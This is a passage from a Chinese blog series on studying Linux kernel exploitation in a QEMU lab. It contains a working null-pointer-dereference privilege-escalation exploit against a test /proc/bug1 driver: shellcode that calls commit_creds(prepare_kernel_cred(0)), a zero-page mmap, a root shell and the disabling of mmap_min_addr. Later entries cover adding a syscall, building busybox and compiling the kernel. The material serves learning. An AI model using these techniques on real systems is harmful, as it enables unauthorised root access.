class="code"><pre><span class="line">运行poc</span><br><span class="line">$ ./poc</span><br></pre></td></tr></table></figure><p>然后进入usr目录，挂载驱动后运行poc程序。<br><a href="http://i2.muimg.com/567571/d9c6c7f76d44cd49.png" class="gallery-item"><img src="http://i2.muimg.com/567571/d9c6c7f76d44cd49.png"></a><br><a href="http://i1.piimg.com/567571/d4b0b3e61d7fc12c.png" class="gallery-item"><img src="http://i1.piimg.com/567571/d4b0b3e61d7fc12c.png"></a></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">给当前进程赋予root权限</span><br><span class="line">commit_creds(prepare_kernel_cred(0));</span><br></pre></td></tr></table></figure><h3 id="实现方法-1-通用获取"><a href="#实现方法-1-通用获取" class="headerlink" title="实现方法 1 通用获取"></a>实现方法 1 通用获取</h3><p>K0 师傅告诉我了一个姿势，可以通用提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);</span><br><span class="line">typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);</span><br><span class="line"> </span><br><span class="line">_commit_creds commit_creds &#x3D; (_commit_creds)COMMIT_CREDS;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred &#x3D; (_prepare_kernel_cred)PREPARE_KERNEL_CRED;</span><br><span class="line"> </span><br><span class="line">void get_root_payload(void) &#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在内存里找到commit creds和prepare kernel cred 这两个函数地址然后就直接写在一个函数里到漏洞触发的时候，直接引用这个函数地址就可以提权了</p><p>但是，我们这里简单的使用方法 2 即可c</p><h3 id="实现方法-2-简单的取得commit-creds、prepare-kernel-cred地址"><a href="#实现方法-2-简单的取得commit-creds、prepare-kernel-cred地址" class="headerlink" title="实现方法 2  简单的取得commit_creds、prepare_kernel_cred地址"></a>实现方法 2  简单的取得commit_creds、prepare_kernel_cred地址</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ grep commit_creds /proc/kallsyms</span><br><span class="line">$ grep prepare_kernel_cred /proc/kallsyms</span><br></pre></td></tr></table></figure><p><a href="http://i2.muimg.com/567571/187cbbe3fbce5987.png" class="gallery-item"><img src="http://i2.muimg.com/567571/187cbbe3fbce5987.png"></a></p><h3 id="设置payload"><a href="#设置payload" class="headerlink" title="设置payload"></a>设置payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">汇编对应的payload</span><br><span class="line">xor %eax,%eax</span><br><span class="line">call 0xc10680d0</span><br><span class="line">call 0xc1067f30</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">编译上述汇编</span><br><span class="line">$ gcc -o payload payload.s -nostdlib -Ttext&#x3D;0 </span><br><span class="line"></span><br><span class="line">得到payload的机器码</span><br><span class="line">$ objdump -d payload</span><br><span class="line">payload：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;__bss_start-0x100d&gt;:</span><br><span class="line">   0:31 c0                xor    %eax,%eax</span><br><span class="line">   2:e8 c9 80 06 c1       call   c10680d0 &lt;_end+0xc10670c0&gt;</span><br><span class="line">   7:e8 24 7f 06 c1       call   c1067f30 &lt;_end+0xc1066f20&gt;</span><br><span class="line">   c:c3                   ret   </span><br><span class="line"></span><br><span class="line">payload机器码</span><br><span class="line">$ \x31\xc0\xe8\xc9\x80\x06\xc1\xe8\x24\x7f\x06\xc1\xc3</span><br></pre></td></tr></table></figure><h3 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h3><p>我们需要分配0地址空间然后放入shellcode，然后jmp过去执行shellcode，使当前进程有root权限，然后执行一个system(“/bin/sh”);在程序返回用户态之后拿到一个root的shell。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ vim <span class="built_in">exp</span>.c</span><br><span class="line">$ cat <span class="built_in">exp</span>.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> payload[] = <span class="string">&quot;\x31\xc0\xe8\xc9\x80\x06\xc1\xe8\x24\x7f\x06\xc1\xc3&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        mmap(<span class="number">0</span>, <span class="number">4096</span>,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,<span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(<span class="number">0</span>, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/bug1&quot;</span>, O_WRONLY);</span><br><span class="line">        write(fd, <span class="string">&quot;wing&quot;</span>, <span class="number">4</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);<span class="comment">//get root shell</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ gcc -<span class="keyword">static</span> -o <span class="built_in">exp</span> <span class="built_in">exp</span>.c</span><br></pre></td></tr></table></figure><h3 id="测试exp"><a href="#测试exp" class="headerlink" title="测试exp"></a>测试exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./exp</span><br></pre></td></tr></table></figure><p><a href="http://i1.piimg.com/567571/984a5526d03f5df1.png" class="gallery-item"><img src="http://i1.piimg.com/567571/984a5526d03f5df1.png"></a></p><blockquote><p>图中均是#不是<code>$</code>，但是从gdb中可以看到payload已经执行，所以如果是普通用户的话，是可以拿到root shell，当然是在0地址可以mmap情况下。<br>mmap_min_addr禁止用户映射低地址。</p></blockquote><h2 id="qemu中添加普通用户并测试"><a href="#qemu中添加普通用户并测试" class="headerlink" title="qemu中添加普通用户并测试"></a>qemu中添加普通用户并测试</h2><blockquote><p>使用adduser添加用户</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser wing</span><br></pre></td></tr></table></figure><blockquote><p>read-only file system 解决办法</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注意remount, rw之间需要空格</span><br><span class="line"><span class="comment"># mount -o remount, rw /   </span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># adduser wing</span><br><span class="line">adduser : &#x2F;etc&#x2F;group: No such file or directory</span><br><span class="line">adduser : &#x2F;home&#x2F;wing: No such file or directory</span><br></pre></td></tr></table></figure><blockquote><p>解决办法:touch对应的文件，并建立相关的目录</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># touch /etc/group</span></span><br><span class="line"><span class="comment"># touch /etc/passwd</span></span><br><span class="line"><span class="comment"># touch /etc/shadow</span></span><br><span class="line"><span class="comment"># mkdir -p /home/wing</span></span><br><span class="line"><span class="comment"># adduser wing</span></span><br><span class="line">adduser : use <span class="string">&#x27;wing&#x27;</span> <span class="keyword">in</span> use</span><br></pre></td></tr></table></figure><blockquote><p>切换成对应的普通用户并运行exp,运行过程中出现问题 </p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sysctl -w vm.mmap_min_addr=&quot;0&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>分析原因(图exp-error-reason)发现是在mmap之后出错 都没走到0地址处,2.6.32内核已经使用mmap_min_addr作为缓解措施mmap_min_addr为4096，需要设置下mmap_min_addr</p></blockquote><blockquote><p>设置完成之后，重新运行exp即可得到root shell<br><a href="http://i2.muimg.com/567571/d9c6c7f76d44cd49.png" class="gallery-item"><img src="http://i2.muimg.com/567571/d9c6c7f76d44cd49.png"></a></p></blockquote><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>Joker‘ markdown<br><a href="http://bobao.360.cn/learning/detail/3702.html">【系列分享】Linux 内核漏洞利用教程（二）：两个Demo</a><br><a href="https://beyermatthias.de/blog/2016/11/01/setup-for-linux-kernel-dev-using-qemu/">Setup for linux kernel dev using qemu</a><br><a href="https://tc.gtisc.gatech.edu/bss/2014/r/kernel-exploits.pdf">linux_kernel_exploit</a></p><p><a href="https://wiki.debian.org/mmap_min_addr">mmap_min_addr - Debian Wiki</a></p><h2 id="用到的payload转换脚本"><a href="#用到的payload转换脚本" class="headerlink" title="用到的payload转换脚本"></a>用到的payload转换脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;joker&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">   0:31 c0                xor    %eax,%eax</span></span><br><span class="line"><span class="string">   2:e8 b9 7f 06 c1       call   c1067fc0 &lt;_end+0xc1066f94&gt;</span></span><br><span class="line"><span class="string">   7:e8 14 7e 06 c1       call   c1067e20 &lt;_end+0xc1066df4&gt;</span></span><br><span class="line"><span class="string">   c:81 ec 00 01 00 00    sub    $0x100,%esp</span></span><br><span class="line"><span class="string">  12:50                   push   %eax</span></span><br><span class="line"><span class="string">  13:50                   push   %eax</span></span><br><span class="line"><span class="string">  14:68 2f 73 68 00       push   $0x68732f</span></span><br><span class="line"><span class="string">  19:68 2f 62 69 6e       push   $0x6e69622f</span></span><br><span class="line"><span class="string">  1e:89 e1                mov    %esp,%ecx</span></span><br><span class="line"><span class="string">  20:16                   push   %ss</span></span><br><span class="line"><span class="string">  21:51                   push   %ecx</span></span><br><span class="line"><span class="string">  22:9c                   pushf</span></span><br><span class="line"><span class="string">  23:0e                   push   %cs</span></span><br><span class="line"><span class="string">  24:68 5c 71 44 c1       push   $0xc144715c</span></span><br><span class="line"><span class="string">  29:cf                   iret&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">pattern = re.compile(<span class="string">&quot; &#123;2,&#125;&quot;</span>,re.S)</span><br><span class="line">payload_all = <span class="string">&quot;&quot;</span></span><br><span class="line">lines = payload.split(<span class="string">&quot;\n&quot;</span>)[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    text,_= pattern.subn(<span class="string">&quot;&quot;</span>,line.split(<span class="string">&quot;\t&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    payload1 = <span class="string">&quot;\\x&quot;</span> + text.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;\\x&quot;</span>)</span><br><span class="line">    payload_all += payload1</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload_all</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Linux-kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-kernel expoit  study (2)---添加系统调用</title>
      <link href="add-a-system-call.html"/>
      <url>add-a-system-call.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="添加一个新的系统调用"><a href="#添加一个新的系统调用" class="headerlink" title="添加一个新的系统调用"></a>添加一个新的系统调用</h1><h2 id="添加一个系统调用的文件"><a href="#添加一个系统调用的文件" class="headerlink" title="添加一个系统调用的文件"></a>添加一个系统调用的文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/linux_kernel/linux-2.6.32.1/</span><br><span class="line">$  mkdir swing_test</span><br><span class="line">$ <span class="built_in">cd</span> swing_test</span><br><span class="line">$ cat swing_test.c</span><br><span class="line"><span class="comment">#include &lt;linux/kernel.h&gt;</span></span><br><span class="line">asmlinkage long sys_swing_test(int arg0)&#123;</span><br><span class="line">    printk(<span class="string">&quot;I am syscall&quot;</span>);</span><br><span class="line">    printk(<span class="string">&quot;syscall arg %d&quot;</span>,arg0);</span><br><span class="line">    <span class="built_in">return</span> ((long)arg0);</span><br><span class="line">&#125;</span><br><span class="line">asmlinkage long sys_hello(void)&#123;</span><br><span class="line">    printk(<span class="string">&quot;hello my kernel world\n&quot;</span>);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ cat Makefile</span><br><span class="line"><span class="comment">#Makefile start</span></span><br><span class="line">obj-y := joker_test.o</span><br><span class="line"><span class="comment">#Makefile end</span></span><br><span class="line"></span><br><span class="line">修改linux-2.6.32.1根目录下的Makefile</span><br><span class="line"><span class="variable">$vim</span> ~/linux_kernel/linux-2.6.32.1/Makefile</span><br><span class="line">core-y        += kernel/ mm/ fs/ ipc/ security/ crypto/ block/ joker_test/</span><br></pre></td></tr></table></figure><p><a href="http://i4.buimg.com/567571/a965e1c9a1970dd3.png" class="gallery-item"><img src="http://i4.buimg.com/567571/a965e1c9a1970dd3.png"></a> 添加测试目录</p><h2 id="修改系统调用表添加一个新的系统调用"><a href="#修改系统调用表添加一个新的系统调用" class="headerlink" title="修改系统调用表添加一个新的系统调用"></a>修改系统调用表添加一个新的系统调用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vim arch/x86/kernel/syscall_table_32.S</span><br><span class="line">.long sys_swing_test            /* 337 */</span><br></pre></td></tr></table></figure><h2 id="修改系统调用头文件"><a href="#修改系统调用头文件" class="headerlink" title="修改系统调用头文件"></a>修改系统调用头文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vim ./arch/x86/include/asm/unistd_32.h</span><br><span class="line"><span class="comment">#define __NR_swing_test         337</span></span><br></pre></td></tr></table></figure><h2 id="添加库文件方便测试新的系统调用接口"><a href="#添加库文件方便测试新的系统调用接口" class="headerlink" title="添加库文件方便测试新的系统调用接口"></a>添加库文件方便测试新的系统调用接口</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">在linux kernel源码根目录</span><br><span class="line">$ mkdir swing_test_syscall_lib</span><br><span class="line">$ vim swing_test_syscall_lib.c</span><br><span class="line">$ cat swing_test_syscall_lib.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _swing_test_ 337</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n Diving to kernel level\n\n&quot;</span>);</span><br><span class="line">syscall(_swing_test_,<span class="number">1234</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nRising to user level\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ gcc swing_test_syscall_lib joker_test_syscall_lib.c -o swing_test_sycall -<span class="built_in">stack</span></span><br></pre></td></tr></table></figure><p>由于编译的内核中，只有下面的busybox文件系统缺少必要的c库等信息，需要把上述的测试文件使用静态编译的方式</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p><code>make</code></p><h2 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h2><h2 id="busybox内核下载"><a href="#busybox内核下载" class="headerlink" title="busybox内核下载"></a><a href="https://busybox.net/downloads/">busybox内核下载</a></h2><p>我这里用的和师傅们都不一样 我用的是busybox-1.22.1 版本</p><h3 id="编译顺序"><a href="#编译顺序" class="headerlink" title="编译顺序"></a>编译顺序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ make menuconfig</span><br></pre></td></tr></table></figure><p>由于之前一直遇到几个错误：</p><ul><li>一个是：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">错误</span><br><span class="line">linux/ext2_fs.h: 没有那个文件或目录</span><br></pre></td></tr></table></figure>解决<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Linux System Utilities ---&gt;</span><br><span class="line">[ ] mkfs_ext2 </span><br><span class="line">[ ] mkfs_vfat</span><br></pre></td></tr></table></figure></li><li>另一个是之后qemu进系统发生的错误：<br><a href="http://i2.muimg.com/567571/cfd5d8842ce9f0ec.png" class="gallery-item"><img src="http://i2.muimg.com/567571/cfd5d8842ce9f0ec.png"></a><br>解决：<br>Busybox Settings -&gt;Build Options -&gt;Build BusyBox as a static binary (no shared libs)<br><a href="http://i2.muimg.com/567571/dbbba270d0e9d27e.png" class="gallery-item"><img src="http://i2.muimg.com/567571/dbbba270d0e9d27e.png"></a><br>$ make<br>$ make install<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">错误</span><br><span class="line">loginutils/passwd.c:<span class="number">188</span>:<span class="number">12</span>: error: ‘RLIMIT_FSIZE’ undeclared (first use in <span class="keyword">this</span> function)</span><br><span class="line">  setrlimit(RLIMIT_FSIZE, &amp;rlimit_fsize);</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">解决</span><br><span class="line">$  vim include/libbb.h</span><br><span class="line">$  add a line <span class="comment">#include &lt;sys/resource.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/resource.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/socket.h&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="配置busybox"><a href="#配置busybox" class="headerlink" title="配置busybox"></a>配置busybox</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> _install</span><br><span class="line"></span><br><span class="line">创建对应的目录</span><br><span class="line">$ mkdir -pv &#123;bin,sbin,etc,proc,sys,usr/&#123;bin,sbin&#125;&#125;</span><br><span class="line">$ cat init</span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mdev -s <span class="comment"># We need this to find /dev/sda later</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line"><span class="built_in">exec</span> /bin/sh</span><br><span class="line">$ chmod +x init</span><br><span class="line">$ find . -print0 \</span><br><span class="line">    | cpio --null -ov --format=newc \</span><br><span class="line">    | gzip -9 &gt; /tmp/initramfs-busybox-x86.cpio.gz</span><br><span class="line">$ qemu-system-i386 -kernel arch/i386/boot/bzImage -initrd /tmp/initramfs-busybox-x86.cpio.gz</span><br></pre></td></tr></table></figure><p><a href="http://i1.piimg.com/567571/2c94ce435cc6c77d.png" class="gallery-item"><img src="http://i1.piimg.com/567571/2c94ce435cc6c77d.png"></a></p><h2 id="在qemu中测试"><a href="#在qemu中测试" class="headerlink" title="在qemu中测试"></a>在qemu中测试</h2><p>把编译好的静态文件添加到busybox中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cp swing_test_syscall_lib ~&#x2F;linux-kernel&#x2F;busybox-1.22.1&#x2F;_install&#x2F;usr&#x2F;</span><br></pre></td></tr></table></figure><p>这里要注意，每次拷贝新文件到busybox的文件系统中去，都要生成新的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ find . -print0 \</span><br><span class="line">    | cpio --null -ov --format=newc \</span><br><span class="line">    | gzip -9 &gt; /tmp/initramfs-busybox-x86.cpio.gz</span><br><span class="line">$ qemu-system-i386 -kernel arch/i386/boot/bzImage -initrd /tmp/initramfs-busybox-x86.cpio.gz</span><br></pre></td></tr></table></figure><p>在qemu中测试系统调用<br>$ qemu-system-i386 -kernel arch/i386/boot/bzImage -initrd /tmp/initramfs-busybox-x86.cpio.gz</p><p>进入到qemu<br><a href="http://i1.piimg.com/567571/6d01c34124e5aaa6.png" class="gallery-item"><img src="http://i1.piimg.com/567571/6d01c34124e5aaa6.png"></a></p><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p><a href="http://bobao.360.cn/learning/detail/3700.html">【系列分享】Linux 内核漏洞利用教程（一）：环境配置</a><br><a href="http://www.cs.rochester.edu/~sandhya/csc256/">Adding a new system call to the Linux kernel</a><br><a href="http://linuxseekernel.blogspot.ie/2014/07/adding-system-call-in-x86-qemu.html">Adding a system call in X86 QEMU Environment</a><br><a href="http://linuxseekernel.blogspot.com/2014/06/create-simple-file-system.html">Create a simple file system</a><br><a href="https://beyermatthias.de/blog/2016/11/01/setup-for-linux-kernel-dev-using-qemu/">Setup for linux kernel dev using qemu</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Linux-kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-kernel expoit  study（1） ---编译并用qemu运行内核</title>
      <link href="Complie-linux-kernel-and-running-it-using-qemu.html"/>
      <url>Complie-linux-kernel-and-running-it-using-qemu.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>Joker师傅老早前发了两个 linux kernel的pwn demo给我们，我到现在才开始搞</p><h1 id="编译linux-kernel"><a href="#编译linux-kernel" class="headerlink" title="编译linux kernel"></a>编译linux kernel</h1><h2 id="linux内核下载"><a href="#linux内核下载" class="headerlink" title="linux内核下载"></a><a href="https://www.kernel.org/pub/linux/kernel/v2.6/">linux内核下载</a></h2><p>创建目录，放我们要放的linux kernel</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ madir linux-kernel</span><br><span class="line">$ <span class="built_in">cd</span> linux-kernel</span><br><span class="line">$ mkdir linux-2.6.32.1</span><br><span class="line">$ <span class="built_in">cd</span> linux-2.6.32.1/</span><br><span class="line">$ wget https://www.kernel.org/pub/linux/kernel/v2.6/linux-2.6.32.1.tar.gz -O linux-2.6.32.1.tar.gz </span><br></pre></td></tr></table></figure><h2 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tar -xjvf linux-2.6.32.1.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> linux-2.6.32.1/</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 